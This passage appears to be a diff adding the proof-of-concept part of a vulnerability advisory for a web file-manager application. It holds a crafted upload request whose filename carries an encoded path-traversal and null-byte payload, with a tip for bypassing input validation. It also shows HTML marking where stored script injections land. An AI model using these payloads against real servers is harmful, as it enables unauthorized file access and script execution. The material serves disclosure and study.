@@ -1,0 +1,37 @@
+Proof of Concept:
+=================
+1.1
+The local file include web vulnerability can be exploited by remote attackers without user interaction and without 
+privileged application user account. For demonstration or reproduce ...
+
+Example:
+File > Upload via POST > Tamper Session > Change Filename Value to File or Path + Extension > Open Listing > Execution 
+
+PoC: (POST)
+-----------------------------1337341202721337
+Content-Disposition: form-data; name="file"; filename="..%2F..%2F..%2F..%2Fcmd>home>tmp%00<'.JPG"
+Content-Type: image/jpg
+
+Note: Encode the request ago to bypass the encoding validation of the input. (%2F)
+
+Reference(s):
+http://192.168.0.10:41491/
+
+
+1.2
+The persistent input validation vulnerability can be exploited by remote attackers without user interaction and without 
+privileged application user account. For demonstration or reproduce ...
+
+
+PoC: Index - Folder Dir Listing
+
+<tbody id="filelist"><tr><td><input name="chxItem" value="[PERSISTENT INJECTED SCRIPT CODE!]" 
+onclick="selChkItem(this)" type="checkbox"></td><td><a href="/[PERSISTENT INJECTED SCRIPT CODE!]%3C?guid=
+47E79C76-D4C2-4086-B695-3CEE71A6B5F3&type=child" class="file"><span style="vertical-align:middle;"><img 
+src="/Folder.png" 
+style="border:0;vertical-align:middle" ;=""></span>%20"><[PERSISTENT INJECTED SCRIPT CODE!];)" <<="" a=""></td><td></td>
+<td>2013-02-10 22:57:54</td><td><input name="commit" type="button" value="Delete" 
+onclick="DelegateData('/[PERSISTENT INJECTED SCRIPT CODE!]','47E79C76-D4C2-4086-B695-3CEE71A6B5F3');" 
+class='button' /></form></td></tr></tbody></table></iframe></a></td></tr><tr><td colspan="5"><span class="total">1 
+items</span>
+</td></tr></tbody>
